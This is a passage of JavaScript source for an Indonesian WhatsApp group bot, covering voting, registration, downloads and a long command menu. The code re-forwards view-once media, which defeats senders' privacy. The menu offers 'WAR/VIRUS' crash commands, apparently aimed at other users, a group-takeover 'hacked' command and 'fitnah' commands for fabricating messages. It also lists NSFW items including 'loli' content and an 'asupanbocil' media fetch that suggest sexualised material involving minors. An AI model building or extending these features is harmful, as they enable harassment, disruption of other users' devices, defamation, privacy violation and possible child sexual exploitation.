            addBalance(sender, randomNomor(20), balance)
			console.log(rojak)
			};

            if (budy.toLowerCase() === `7716`){
		if (isRegister) return 
		    register.push(sender)
		    fs.writeFileSync('./database/registered.json', JSON.stringify(register))
		    letteks = `Verification success\n\nPlease send *!menu* to view menu`
		    addKoinUser(sender, randomNomor(100), balance)
		    arifi.sendMessage(from, teks, text, {quoted: fvn })
            };
    if (!isGroup && prefix && command)
      console.log(
        '\x1b[1;31m~\x1b[1;37m>',
        '[\x1b[1;32mEXEC\x1b[1;37m]',
        time,
        color(command),
        'from',
        color(sender.split('@')[0]),
        'args :',
        color(args.length)
      );
    //if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
    if (prefix && command && isGroup)
      console.log(
        '\x1b[1;31m~\x1b[1;37m>',
        '[\x1b[1;32mEXEC\x1b[1;37m]',
        time,
        color(command),
        'from',
        color(sender.split('@')[0]),
        'in',
        color(groupName),
        'args :',
        color(args.length)
      );
      
    if (isGroup && !isVote) {
      if (budy.toLowerCase() === 'vote') {
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : '6283152753417@s.whatsapp.net';
        if (fil.includes(id_vote)) {
          return mentions(
            '@' + sender.split('@')[0] + ' Anda sudah vote',
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: '✅',
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            '*Vote* ' +
            '@' +
            _votes[0].votes.split('@')[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split('@')[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      } else if (budy.toLowerCase() === 'devote') {
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : '6283152753417@s.whatsapp.net';
        if (fil.includes(id_vote)) {
          return mentions(
            '@' + sender.split('@')[0] + ' Anda sudah vote',
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: '❌',
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            '*Vote* ' +
            '@' +
            _votes[0].votes.split('@')[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split('@')[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      }
    }
    let sendKontak = (from, nomor, nama, org, Ponsel, descBiz = '') => {
      let vcard =
        'BEGIN:VCARD\n' +
        'VERSION:3.0\n' +
        'FN:' +
        nama +
        '\n' +
        'ORG:' +
        org +
        '\n' +
        'TEL;type=CELL;type=VOICE;waid=' +
        nomor +
        ':+' +
        nomor +
        '\n' +
        'END:VCARD';
        let nano = `Berikut Adalah Nomor Developer Saya, Silahkan Chat/Simpan Nomor Developer Saya.\n\n*NB: Dilarang Chat Yang Tidak Berkepentingan.*`
      arifi.sendMessage(
        from,
        { displayname: nama, vcard: vcard },
        MessageType.contact,
        { quoted: rojak, caption: nano}
      );
    }; 

if (budy.includes('https://')) {
if (!rojak.key.fromMe){
				if (!isGroup && !isAntiLink) return
				if (isGroupAdmins) return reply('Atasan grup mah bebas yakan :v')
				arifi.updatePresence(from, Presence.composing)
				var kic = `${sender.split('@')[0]}@s.whatsapp.net`
				reply('Link terdeteksi, Maaf Anda Di Keluarkan!\n\n *NB: Dilarang Promosi.*')
			    arifi.groupRemove(from, [kic]).catch((e) => { reply('bot harus jadi admin') })
			}
			}
			if (bad.includes(commander)) {
				reply('Astagfirullah')
				}
    if (isGroup && isAntiviewonce && m.mtype == 'viewOnceMessage') {
      reply(
        `@${sender.split('@')[0]} Terdeteksi mengirim gambar/video viewonce!`
      );
      var msg = { ...rojak };
      msg.rojak = rojak.message.viewOnceMessage.message;
      msg.rojak[Object.keys(msg.rojak)[0]].viewOnce = false;
      arifi.copyNForward(m.chat, msg);
    }
  
    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color('[ANTI-HIDETAG]', 'red'),
        color(`@${sender.split('@')[0]} mengirim pesan hidetag`, 'white')
      );
      reply(`@${sender.split('@')[0]} Terdeteksi mengirim pesan hidetag!!`);
      kick(from, sender);
    }

    if (isGroup && isAntivirtex && !rojak.key.fromMe) {
      if (budy.length > 1200) {
        if (isGroupAdmins) return reply('admin bebas');
        arifi.updatePresence(from, Presence.composing)
        let ayhd = '\n'.repeat(420)
        var kic = `${sender.split('@')[0]}@s.whatsapp.net`
        arifi.reply(from, `${ayhd}\nAnti Virtex Terdeteksi, pengguna ${kic} Telah Mengirimkan Virtex\n\n*NB:* Teks Anda Membuat Lag Grup Ini\n\n\nMaaf ${pushname} Anda Di Keluarkan Dalam Grup\n\n _Clear Chat © By @arifirazzaq2001_`, rojak)
        arifi.groupRemove(from, [kic]).catch((e) => { arifi.reply(from, global.db.mess.BotAdmin, rojak) })
        }
    }
    if (isGroup && autojoin == true) {
      if (budy.includes('://chat.whatsapp.com/')) {
        console.log(
          color('[AUTO-JOIN]', 'red'),
          color('YAHAHAHHAHAH', 'white')
        );
        arifi.query({
          json: [
            'action',
            'invite',
            `${budy.replace('https://chat.whatsapp.com/', '')}`,
          ],
        });
      }
    }
    if (isGroup && isKickarea && !rojak.key.fromMe) {
      if (!sender.includes('62')) {
        reply('GRUP ONLY +62!');
        arifi.groupRemove(from, [sender]);
      }
    }
   
  let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

      await arifi.setStatus(`Aktif Selama: ${uptime} | Mode: ${banChats ? 'SELF-MODE' : 'PUBLIC-MODE'}`).catch((_) => _);
      settingstatus = new Date() * 1;            
          }
    if (!rojak.key.fromMe && banChats === true) return;      

    switch(butresx){
case 'MP3': 
try {
reply('_Lagu yang anda cari Sedang DiProsess.._')
let yut = await yts(q3)
yta(yut.videos[0].url)
.then((res) => {
let { dl_link, foto, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then((a) => {
if (Number(filesize) >= 30000) return sendMediaURL(from, foto, `*P L A Y  M P 3*\n\n${shp} Title : ${title}\n${shp} Ext : MP3\n${shp} Filesize : ${filesizeF}\n${shp} Upload : ${yut.videos[0].ago}\n${shp} Views : ${yut.videos[0].views}\n${shp} Duration : ${yut.videos[0].timestamp}\n${shp} Link : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)

let captionis = `*P L A Y  M P 3*\n\n${shp} Title : ${title}\n${shp} Size : ${filesizeF}\n${shp} Views: ${yut.videos[0].views}\n${shp} Duration : ${yut.videos[0].timestamp}\n${shp} URL : ${yut.videos[0].url}\n\n*_Permintaan Anda Sedang Di Prosess!_*`
//sendMediaURL(from, foto, captionis)
sendMediaURL(from, dl_link, '')

})
})
.catch((err) => reply(`${err}`))
} catch (err) {
sendMess(ownerNumber2, 'PlayMp3 Error : ' + err)
console.log(color('[PlayMp3]', 'red'), err)
reply(mess.error.api)
}
break

case 'MP4' :
try {
reply(mess.wait)
let yut = await yts(q3)
ytv(yut.videos[0].url)
.then((res) => {
let { dl_link, foto, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then((a) => {
if (Number(filesize) >= 40000) return sendMediaURL(from, foto, `*P L A Y  M P 4*\n\n ${unique[0]} Judul : ${title}\n ${unique[0]} Size : ${filesizeF}\n ${unique[0]} Upload : ${yut.videos[0].ago}\n ${unique[0]} Ditonton : ${yut.videos[0].views}\n ${unique[0]} Duration : ${yut.videos[0].timestamp}\n ${unique[0]} Link : ${a.data}\n\n_Ukuran File Terlalu besar, anda bisa download sendiri lewat Link Diatas!!_`)
                       
let mp4 = `
*PLAY VIDEO\n\n Judul : ${title}\n\n Size : ${filesizeF}\n\n Upload : ${yut.videos[0].ago}\n\n Ditonton : ${yut.videos[0].views}\n\n Duration : ${yut.videos[0].timestamp}\n\n Url : ${yut.videos[0].url}`
//sendMediaURL(from, foto, mp4)
sendMediaURL(from, dl_link, mp4)
limitAdd(sender, limit)
})
})
.catch((err) => reply(`${err}`))
} catch (err) {
sendMess(ownerNumber2, 'PlayMp4 Error : ' + err)
console.log(color('[PlayMp4]', 'red'), err)
reply(mess.error)
}
break
  
}
    		
    switch (command) {
//CASE BY SYIKO(Mu'adz) X SENKU
//JAN COPAS YA BANG:v
    case 'ytplay':
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 	  
if (args.length < 1) return reply(`Kirim perintah *${prefix}ytplay judul music/video*`)
reply(mess.wait)
let yut = await yts(q)
yta(yut.videos[0].url)
.then(async(res) => {
let { foto, title, filesizeF, filesize } = res
let capti = `*P L A Y*\n\n Title : ${title}\n\n Size : ${filesizeF}\n\n Views: ${yut.videos[0].views}\n\n Duration : ${yut.videos[0].timestamp}\n\n URL : ${yut.videos[0].url}`
//sendMediaURL(from, foto, capti)
ya = await getBuffer(thumb)
py =  await arifi.prepareMessage(from, ya, image)
let buttons = [
{buttonId: `${q}`, buttonText: {displayText: 'MP3'}, type: 1},
{buttonId: `${q}`, buttonText: {displayText: 'MP4'}, type: 1}
]
let buttonMessage = {
imageMessage: py.message.imageMessage,
contentText: capti,
footerText: 'Pilih di bawah y bang',
buttons: buttons,
headerType: 4
}
await arifi.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted:rojak})
})
break
        case 'id2':
	arifi.sendMessage(from, `*RULES*:\n${g}⬥DILARANG SPAM/VC${g}\n⬥DILARANG MEMAKAI SEENAKNYA${g}\n⬥BOLEH CULIK BOT ASAL PATUHI RULES\n⬥LIMIT AKAN DIRESET SETIAP 00:00\n⬥JIKA LIMIT KALIAN HABIS, HUBUNGI OWNER UNTUK MENDAPATKAN 10LIMIT\nATAU ${prefix}buylimit UNTUK MEMBELI LIMIT${g}\n*SIMPEL YANG PENTING PATUHI 😌*`, text, {quoted: ftroli})
	break

      case 'id10':
        sendKontak(from, ownerNumber, namaowner, 'sibuk');
        break; 
        
        case 'menu':
        case 'help':
          let menuu = `${ucapanWaktu} @${senderr.split('@')[0]}
           
${g}⦿ TIME${g}
*${unique[0]} Jam :* ${jam}
*${unique[0]} Hari :* ${week} ${weton}
*${unique[0]} Tanggal :* ${date}

${g}⦿ USER${g}
*${unique[0]} Sisa Limit :* ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}\n*${unique[0]} Limit Game :* ${cekGLimit(sender, gcount, glimit)}/${gcount}\n*${unique[0]} Balance :* $${getBalance(sender, balance)}
*${unique[0]} Nama :* ${pushname}
*${unique[0]} Status :* ${isPremium ? 'Premium':'Free'}
*${unique[0]} Status User :* ${isOwner ? 'Owner':'User'}

${g}⦿ INFO BOT${g}
*${unique[0]} Prefix :* 「 ${prefixStatus ? 'Multi Prefix' : 'No Prefix'} 」
*${unique[0]} Author :* @${numberNon}
*${unique[0]} Runtime :* ${runtime(process.uptime())}
*${unique[0]} Hit Today :* ${hit_today.length} Hit
*${unique[0]} Total Hit :* ${totalhit} Hit
*${unique[0]} Total Chat :* ${totalchat.length} Chat
`
sendButLocation(from, menuu, `${watermark}`, {jpegThumbnail:foto}, [{buttonId:`${prefix}command`,buttonText:{displayText:'📁𝚕𝚒𝚜𝚝 𝚖𝚎𝚗𝚞'},type:1},{buttonId:`${prefix}id10`,buttonText:{displayText:'👤𝚘𝚠𝚗𝚎𝚛'},type:1},{buttonId:`${prefix}id2`,buttonText:{displayText:'🧾𝚛𝚞𝚕𝚎𝚜'},type:1}], {contextInfo: { mentionedJid: [senderr, numberNon + '@s.whatsapp.net']}})
break

case 'selebgramm#' :
reply(`Ketik Link Di Bawah Untuk Melancarkan\n\nhttps://wa.me/687955238?text=#selebgramm#`)
break;

case 'verify':
        case 'ytes#':
        reply('Bot telah mengirimkan kode verifikasi lewat pribadi silahkan di cek dan verify Segera!\n\n *NB:*\n*Tarik Balas/Reply Pesan Ini Dan Masukkan Kode Yang Telah Di Kirim.*')
        arifi.sendMessage(sender, 'Kode Verify Anda : 7716 \n  \nAnda juga dapat mengetuk tautan ini untuk verifikasi: https://wa.me/6289535955988?text=7716 \n  \nKode ini bersifat sementara dan bisa jadi sama dengan orang lain.', text, {quoted: foncevid})
        break

    case 'command':
    if (isBanned) return reply(mess.baned)
    let l = 1
	let run = process.uptime() 
   let teks = `${kyun(run)}`           
try {
var pporang = await arifi.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
} catch {
var pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
let gambarnye = await getBuffer(pporang) 
var menu = `${ucapanWaktu} _${pushname}_ @${senderr.split('@')[0]}

${g}⦿ USER${g}
*${unique[0]} Sisa Limit :* ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}\n*${unique[0]} Limit Game :* ${cekGLimit(sender, gcount, glimit)}/${gcount}\n*${unique[0]} Balance :* $${getBalance(sender, balance)}
*${unique[0]} Nama :* ${pushname}
*${unique[0]} Status :* ${isPremium ? 'Premium':'Free'}
*${unique[0]} Status User :* ${isOwner ? 'Owner':'User'}

${g}─ ⌜ OWNER ⌟ ─${g}
${l++}. ${prefix}addprem [@tag/day]
${l++}. ${prefix}delprem [tag]
${l++}. ${prefix}setthumb [reply foto]
${l++}. ${prefix}settarget [62xxx]
${l++}. ${prefix}setfakeimg [reply foto]
${l++}. ${prefix}setreply [reply foto]
${l++}. ${prefix}setprefix [2 Button]
${l++}. ${prefix}setpp <reply image>
${l++}. ${prefix}ban <tag/reply>
${l++}. ${prefix}unban <tag/reply>
${l++}. ${prefix}mode [2 Button self/public]
${l++}. ${prefix}term <code>
${l++}. ${prefix}eval <code>
${l++}. ${prefix}colongsw [reply sw]
${l++}. ${prefix}bc [teks/foto]
${l++}. ${prefix}bcnowm [teks/foto]
${l++}. ${prefix}bcbutton [teks/foto]
${l++}. ${prefix}bcstik [reply sticker]
${l++}. ${prefix}bcaudio [reply audio]
${l++}. ${prefix}bcvideo [reply video]
${l++}. ${prefix}addvn [reply audio]
${l++}. ${prefix}delvn [reply audio]
${l++}. ${prefix}giftlimit <tag>
${l++}. ${prefix}addvn <reply audio>
${l++}. ${prefix}delvn <reply audio>
${l++}. ${prefix}off <alasan>
${l++}. ${prefix}on
${l++}. ${prefix}status

${g}─ ⌜ GROUP ⌟ ─${g}
${l++}. ${prefix}grup [3 Button]
${l++}. ${prefix}linkgc
${l++}. ${prefix}promote <reply chat member>
${l++}. ${prefix}demote <reply chat member>
${l++}. ${prefix}setdesc [teks]
${l++}. ${prefix}setname [teks]
${l++}. ${prefix}kick <reply/tag member>
${l++}. ${prefix}add <reply/tag member>
${l++}. ${prefix}getbio <reply chat member>
${l++}. ${prefix}getname <reply chat member>
${l++}. ${prefix}reminder <msg/2s>
${l++}. ${prefix}listonline
${l++}. ${prefix}sider [reply chat bot]
${l++}. ${prefix}antilink [button]
${l++}. ${prefix}antihidetag [button]
${l++}. ${prefix}antiviewonce [button]
${l++}. ${prefix}antivirtex [button]
${l++}. ${prefix}kickarea [button] _AntiBule_
${l++}. ${prefix}nsfw [button]
${l++}. ${prefix}closetime/opentime [detik/menit/jam/]
${l++}. ${prefix}level
${l++}. ${prefix}leveling

${g}─ ⌜ RPG ⌟ ─${g}
${l++}. ${prefix}potion
${l++}. ${prefix}usepotion
${l++}. ${prefix}heal
${l++}. ${prefix}adventure
${l++}. ${prefix}buypotion

${g}─ ⌜ BALANCE ⌟ ─${g}
${l++}. ${prefix}limitm
${l++}. ${prefix}limit
${l++}. ${prefix}buylimit

${g}─ ⌜ MAKER CONVERT ⌟ ─${g}
${l++}. ${prefix}sticker [reply foto]
${l++}. ${prefix}swm <author|packname>
${l++}. ${prefix}take <author|packname>
${l++}. ${prefix}fdeface
${l++}. ${prefix}emoji [example: ${prefix}emoji 😎]
${l++}. ${prefix}stickwasted 

${g}─ ⌜ ISLAMI ⌟ ─${g}
${l++}. ${prefix}quranaudio 
${l++}. ${prefix}jadwalsholat 
${l++}. ${prefix}niatsholat 
${l++}. ${prefix}asmaulhusna 
${l++}. ${prefix}kisahnabi
${l++}. ${prefix}quran
${l++}. ${prefix}ayat
${l++}. ${prefix}ayat2

${g}─ ⌜ RANDOM TEXT ⌟ ─${g}
${l++}. ${prefix}quotesyt
${l++}. ${prefix}quotes
${l++}. ${prefix}quotesdilan
${l++}. ${prefix}quotesimage
${l++}. ${prefix}katabijak
${l++}. ${prefix}randomnama
${l++}. ${prefix}fakta lunik

    
${g}─ ⌜ CONVERT ⌟ ─${g}
${l++}. ${prefix}toimg [reply foto]
${l++}. ${prefix}tomp3 [reply video]
${l++}. ${prefix}tomp4 [reply sticker/gif]
${l++}. ${prefix}slowmo [reply vn]
${l++}. ${prefix}tupai [reply vn]
${l++}. ${prefix}gemok [reply vn]
${l++}. ${prefix}tourl [reply foto]
${l++}. ${prefix}tg [reply foto]
${l++}. ${prefix}imgurl [reply foto]
    
${g}─ ⌜ DOWNLOADER ⌟ ─${g}
${l++}. ${prefix}youtube <link video YouTube>
${l++}. ${prefix}instagram <link foto/Instagram>
${l++}. ${prefix}twitter <link Twitter>
${l++}. ${prefix}igstory <username>
${l++}. ${prefix}twitter <link>
${l++}. ${prefix}tiktok <link>
${l++}. ${prefix}ytplay <judul music/video>
${l++}. ${prefix}fb <link>

${g}─ ⌜ UP STORY ⌟ ─${g}
${l++}. ${prefix}upswteks
${l++}. ${prefix}upswimage
${l++}. ${prefix}upswvideo

${g}─ ⌜ KERANG AJAIB  ⌟ ─${g}
${l++}. ${prefix}pantun
${l++}. ${prefix}watak
${l++}. ${prefix}math
${l++}. ${prefix}truth
${l++}. ${prefix}dare
${l++}. ${prefix}bisakah
${l++}. ${prefix}kapankah
${l++}. ${prefix}apakah
${l++}. ${prefix}jadian

${g}─ ⌜ FUN  ⌟ ─${g}
${l++}. ${prefix}fitnah 
${l++}. ${prefix}fitnahpc
${l++}. ${prefix}kontak
${l++}. ${prefix}artinama

${g}─ ⌜ GAME ⌟ ─${g}
${l++}. ${prefix}tebakanime
${l++}. ${prefix}tebaklirik
${l++}. ${prefix}tebakkimia
${l++}. ${prefix}tebakbendera
${l++}. ${prefix}siapakahaku
${l++}. ${prefix}tebakgambar
${l++}. ${prefix}family100

${g}─ ⌜ TAG ⌟ ─${g}
${l++}. ${prefix}hidetag
${l++}. ${prefix}kontag
${l++}. ${prefix}sticktag
${l++}. ${prefix}totag

${g}─ ⌜ ANIMANGA ⌟ ─${g}
${l++}. ${prefix}character <query>
${l++}. ${prefix}otakudesusearch <query>
${l++}. ${prefix}otakudesu <link>
${l++}. ${prefix}kusonimesearch <query>
${l++}. ${prefix}kusonime <link>
${l++}. ${prefix}anime <query>
${l++}. ${prefix}manga <query>
${l++}. ${prefix}otaku <query>
${l++}. ${prefix}chara <query>
${l++}. ${prefix}komiku <query>
${l++}. ${prefix}storyanime
${l++}. ${prefix}waifu
${l++}. ${prefix}loli
${l++}. ${prefix}cosplay
${l++}. ${prefix}wallpaperanime
${l++}. ${prefix}neko
${l++}. ${prefix}izumisagiri
${l++}. ${prefix}animefanart

${g}─ ⌜ SEARCHING ⌟ ─${g}
${l++}. ${prefix}caripesan <query>
${l++}. ${prefix}get
${l++}. ${prefix}ytsearch <query>
${l++}. ${prefix}igstalk <query>
${l++}. ${prefix}githubstalk <query>
${l++}. ${prefix}tiktokstalk <query>
${l++}. ${prefix}brainly <query>
${l++}. ${prefix}image <query>
${l++}. ${prefix}pinterest <query>
${l++}. ${prefix}lirik <query>
${l++}. ${prefix}playstore <query> 
${l++}. ${prefix}wikiped <query> 
${l++}. ${prefix}gimage <query> 
${l++}. ${prefix}gimage2 <query> 
${l++}. ${prefix}wallpapersearch <query> 
${l++}. ${prefix}wallpapersearch2 <query> 
${l++}. ${prefix}wallpaper <query> 
${l++}. ${prefix}stickerwa <query> 
${l++}. ${prefix}konachan <query> 
${l++}. ${prefix}google <query> 
${l++}. ${prefix}happymod <query> 

${g}─ ⌜ OTHER ⌟ ─${g}
${l++}. ${prefix}ping
${l++}. ${prefix}inspect
${l++}. ${prefix}join <link group>
${l++}. ${prefix}limit 
${l++}. ${prefix}chat 
${l++}. ${prefix}ttp <teks>
${l++}. ${prefix}ttp2 <teks>
${l++}. ${prefix}ttp3 <teks>
${l++}. ${prefix}ttp4 <teks>
${l++}. ${prefix}attp <teks>             
${l++}. ${prefix}delete

${g}─ ⌜ RANDOM NSFW ⌟ ─${g}
${l++}. ${prefix}nsfwneko
${l++}. ${prefix}nsfwloli
${l++}. ${prefix}nsfwwaifu
${l++}. ${prefix}hentai
${l++}. ${prefix}yuri
${l++}. ${prefix}nsfweroyuri
${l++}. ${prefix}nsfwero
${l++}. ${prefix}nsfwkuni

${g}─ ⌜ TEXT PRO ⌟ ─${g}
${l++}. ${prefix}tiktok
${l++}. ${prefix}arcade8bit
${l++}. ${prefix}battlefield4
${l++}. ${prefix}pubg
${l++}. ${prefix}bannerlol
${l++}. ${prefix}pornhub
${l++}. ${prefix}glitch
${l++}. ${prefix}avenger
${l++}. ${prefix}space
${l++}. ${prefix}ninjalogo
${l++}. ${prefix}marvelstudio
${l++}. ${prefix}lionlogo
${l++}. ${prefix}wolflogo
${l++}. ${prefix}steel3d
${l++}. ${prefix}wallgravity
${l++}. ${prefix}text3dbox
${l++}. ${prefix}text3d
${l++}. ${prefix}leavestext
${l++}. ${prefix}textlight
${l++}. ${prefix}matrix
${l++}. ${prefix}tahta

${g}─ ⌜ TEXT PRO v2 ⌟ ─${g}
${l++}. ${prefix}wetglass
${l++}. ${prefix}multicolor3d
${l++}. ${prefix}watercolor
${l++}. ${prefix}luxurygold
${l++}. ${prefix}galaxywallpaper
${l++}. ${prefix}lighttext
${l++}. ${prefix}beautifulflower
${l++}. ${prefix}puppycute
${l++}. ${prefix}royaltext
${l++}. ${prefix}heartshaped
${l++}. ${prefix}birthdaycake
${l++}. ${prefix}galaxystyle
${l++}. ${prefix}hologram3d
${l++}. ${prefix}greenneon
${l++}. ${prefix}glossychrome
${l++}. ${prefix}greenbush
${l++}. ${prefix}metallogo
${l++}. ${prefix}noeltext
${l++}. ${prefix}glittergold
${l++}. ${prefix}textcake
${l++}. ${prefix}starsnight
${l++}. ${prefix}wooden3d
${l++}. ${prefix}textbyname
${l++}. ${prefix}writegalacy
${l++}. ${prefix}galaxybat
${l++}. ${prefix}snow3d
${l++}. ${prefix}birthdayday
${l++}. ${prefix}goldplaybutton
${l++}. ${prefix}silverplaybutton
${l++}. ${prefix}freefire
${l++}. ${prefix}cartoongravity
${l++}. ${prefix}anonymhacker

${g}─ ⌜ IMAGE EFFECT ⌟ ─${g}
${l++}. ${prefix}wasted
${l++}. ${prefix}glass
${l++}. ${prefix}rip
${l++}. ${prefix}hackereffect

${g}─ ⌜ PREMIUM ⌟ ─${g}
${l++}. ${prefix}jadibot
${l++}. ${prefix}stopjadibot
${l++}. ${prefix}listbot
${l++}. ${prefix}xnxx <link>
${l++}. ${prefix}xhamster <link>
${l++}. ${prefix}nhdl [nuklir]
${l++}. ${prefix}video <query>
${l++}. ${prefix}mediafire

${g}─ ⌜ MAGER ⌟ ─${g}
${l++}. ${prefix}nulis <teks> [button]
${l++}. ${prefix}foliok <teks> [button]

${g}─ ⌜ STICKER CMD ⌟ ─${g}
${l++}. ${prefix}addcmd
${l++}. ${prefix}delcmd
${l++}. ${prefix}listcmd

${g}─ ⌜ VOTE ⌟ ─${g}
${l++}. ${prefix}voting
${l++}. ${prefix}delvote

${g}─ ⌜ WAR/VIRUS ⌟ ─${g}
${l++}. ${prefix}bughole
${l++}. ${prefix}autohole [total]
${l++}. ${prefix}lockhole
${l++}. ${prefix}philips [total]

${g}─ ⌜ AMBIL ALIH GRUP ⌟ ─${g}
${l++}. ${prefix}hacked [nama]
${l++}. ${prefix}selesaikan [on/off] ===help

${g}─ ⌜ ⌟ ─${g}
${l++}. ${prefix}

${g}─ ⌜ AUTO RESPONDEN ⌟ ─${g}
${l++}. ${prefix}addrespon
${l++}. ${prefix}delrespon


 *─ ⌜ ${botUniversal} ⌟ ─*
`;
sendButLocation(from, menu, `${watermark}`, {jpegThumbnail:thumb}, [{buttonId:`${prefix}id10`,buttonText:{displayText:'👤𝚘𝚠𝚗𝚎𝚛'},type:1},{buttonId:`${prefix}id2`,buttonText:{displayText:'🧾𝚛𝚞𝚕𝚎𝚜'},type:1}], {contextInfo: { mentionedJid: [senderr]}})
break

case 'cm': 
 listMsg = {
 buttonText: 'LIST MENU',
 footerText: `${watermark}`,
 description: `Hai kak @${senderr.split('@')[0]}, Silahkan pilih menu disini`,
 sections: [
                     {
                      'title': `${pushname}`,
 rows: [
                          {
                              'title': 'command',
                              'rowId': ''
                           },
                           {
                              'title': 'Speed',
                              'rowId': ''
                           },
                           {
                              'title': 'Status',
                              'rowId': ''
                           },
                           {
                              'title': 'Creator',
                              'rowId': ''
                           },
                           {
                              'title': 'Jadibot',
                              'rowId': ''
                           },
                           {
                              'title': 'Runtime',
                              'rowId': ''
                           },
                           {
                              'title': 'OwnerMenu',
                              'rowId': ''
                           },
                           {
                              'title': 'MakerMenu',
                              'rowId': ''
                           },
                           {
                              'title': 'GroupMenu',
                              'rowId': ''
                           },
                           {
                              'title': 'OtherMenu',
                              'rowId': ''
                           },
                           {
                              'title': 'DownloadMenu',
                              'rowId': ''
                           }
                        ]
                     }],
 listType: 1
}
arifi.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [senderr]},quoted:floc})
await limitAdd(sender)
break
           	case 'limitm':
				   checkLimit(sender)
					break
           	
           	case 'level':{
                if (isGroup && !isLevelingOn) return reply(mess.levelingNotOn)
                    try {
                        var pic = await arifi.getProfilePicture(sender)
                    } catch {
                        var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                    }
                   var tolink = await fetchText('https://tinyurl.com/api-create.php?url=' + pic)
                    let userLevel = getLevelingLevel(sender)
                    let userXp = getLevelingXp(sender)
                    let requiredXp = 200 * (Math.pow(2, getLevelingLevel(sender)) - 1)
                     var link = await getBuffer(`https://api.lolhuman.xyz/api/rank?apikey=${lolkey}&img=${tolink}&background=${foto}&username=${encodeURIComponent(pushname)}&level=${userLevel}&ranking=${role}&currxp=${userXp}&xpneed=${requiredXp}`)
                //    let levelnya = `*──「 LEVEL INFO 」──*\n\n❑ *Name: @${sender.split('@')[0]}*\n❑ *XP: ${userXp} / ${requiredXp}*\n❑ *Level: ${userLevel}*\n❑ *Role: ${role}*`
                    kotod = `*──「 LEVEL INFO 」──*\n\n❑ *Name: @${senderr.split('@')[0]}*\n❑ *XP: ${userXp} / ${requiredXp}*\n❑ *Level: ${userLevel}*\n❑ *Role: ${role}*`
           sendButImage(from, kotod, `${watermark}`, link, [{buttonId: `${prefix}ming`,buttonText: {displayText: `📤LEVEL UP`,},type: 1,}], {contextInfo: { mentionedJid: [senderr]}}) 
        }
        break;   
        
        case 'linkgc':
      case 'linkgrup':
      case 'linkgroup':
             if (!isBotGroupAdmins) return reply(`Bot Harus jadi Admin`)
             linkgc = await arifi.groupInviteCode(from)
             arifi.sendMessage(from, `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`, text, {contextInfo: {'externalAdReply': { 'title': `Nih Kak Link Group ${groupName}`, 'thumbnail': await getBuffer(await arifi.getProfilePicture(from)), 'sourceUrl': 'https://chat.whatsapp.com/${linkgc}' }} })
             break

                    case 'asupan':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanbocil?apikey=${dappakey}`)
                    kodo = `*_CLICK NEXT UNTUK SELANJUTNYA_*`
   sendButVideo(from, kodo, `${watermark}`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `NEXT`,
            },
            type: 1,
          },
        ]);                 
                    break    

                 case 'buypotion': 
                 if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				payout1 = body.slice(11)
				let koinpotionPerpotion = 1000
				let totalpotion = koinpotionPerpotion * payout1
				if ( checkATMuser(sender) <= totalpotion ) return reply(`Maaf uang kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
				if ( checkATMuser(sender) >= totalpotion ) {
		        confirmATM(sender, totalpotion)
		        addPotioUser(sender, payout1)
